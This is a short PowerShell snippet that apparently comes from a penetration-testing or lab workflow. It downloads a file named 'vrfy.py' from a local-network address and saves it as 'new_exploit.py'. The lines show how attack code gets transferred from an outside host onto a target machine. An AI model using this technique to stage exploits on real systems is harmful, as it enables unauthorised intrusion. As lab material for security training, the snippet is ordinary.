$storageDir = $pwd
$webclient = New-Object System.Net.WebClient
$url = "http://192.168.1.18/vrfy.py"
$file = "new_exploit.py"
$webclient.DownloadFile($url, $file)
